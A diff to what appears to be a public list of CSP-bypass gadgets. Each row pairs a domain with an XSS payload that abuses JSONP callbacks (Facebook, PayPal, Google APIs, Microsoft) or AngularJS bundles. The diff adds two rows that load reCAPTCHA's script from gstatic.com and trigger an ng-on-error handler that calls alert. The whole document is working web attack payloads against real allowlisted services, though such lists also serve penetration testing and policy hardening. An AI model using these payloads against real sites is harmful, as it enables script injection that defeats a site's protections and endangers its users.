@@ -48,6 +48,7 @@ gist.github.com	<script src="https://gist.github.com/renniepak/e7afcd7e727e1a0c4
 global.apis.naver.com	<script src="https://global.apis.naver.com/commentBox/cbox/web_neo_list_jsonp.json?_callback=alert"></script>	renniepak
 graph.facebook.com	<script src="https://graph.facebook.com/?id=1337&callback=alert"></script>	kevin_mizu
 gstatic.com	<body ng-app ng-csp><script src="//gstatic.com/fsn/angular_js-bundle1.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>	
+gstatic.com	<script src='https://gstatic.com/recaptcha/about/js/main.min.js'></script><img src=x ng-on-error='$event.target.ownerDocument.defaultView.alert(1)'>	
 gum.criteo.com	<script src="https://gum.criteo.com/sync?c=123&r=2&a=1&j=alert"></script>	renniepak
 inno.blob.core.windows.net	<body ng-app ng-csp><script src="//inno.blob.core.windows.net/new/libs/AngularJS/1.2.1/angular.min.js"></script><div ng-app ng-csp><div ng-focus="x=$event;" id=f tabindex=0>foo</div><div ng-repeat="(key, value) in x.view"><div ng-if="key == 'window'">{{ [1].reduce(value.alert, 1); }}</div></div></div></body>	renniepak
 itunes.apple.com	<script src="https://itunes.apple.com/se/rss/toppodcasts/json?callback=alert"></script>	renniepak
@@ -105,6 +106,7 @@ www.googleapis.com	<script src="https://www.googleapis.com/customsearch/v1?callb
 www.googleapis.com	<script src="https://www.googleapis.com/blogger/v3/blogs/1/posts/1?callback=alert()"></script>	
 www.googletagmanager.com	<script src="https://www.googletagmanager.com/debug/api/vtinfo?gtm_auth=a-0uanYFkML7e3v7Vmxpwg&env_id=env-8&public_id=GTM-TWMCBFD&templates=&callback=alert"></script>	YoeriVegt
 www.gstatic.com	<body ng-app ng-csp><script src="//www.gstatic.com/fsn/angular_js-bundle1.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>	IvarsVids
+www.gstatic.com	<script src='https://www.gstatic.com/recaptcha/about/js/main.min.js'></script><img src=x ng-on-error='$event.target.ownerDocument.defaultView.alert(1)'>	
 www.meteoprog.ua	<script src="https://www.meteoprog.ua/data/weather/informer/Poltava.js?callback=alert(1337)"></script>	
 www.microsoft.com	<script src="https://www.microsoft.com/en-us/research/wp-json?_jsonp=alert"></script>	
 www.paypal.com	<script src="https://www.paypal.com/checkoutnow/remembered?callback=alert"></script>	renniepak
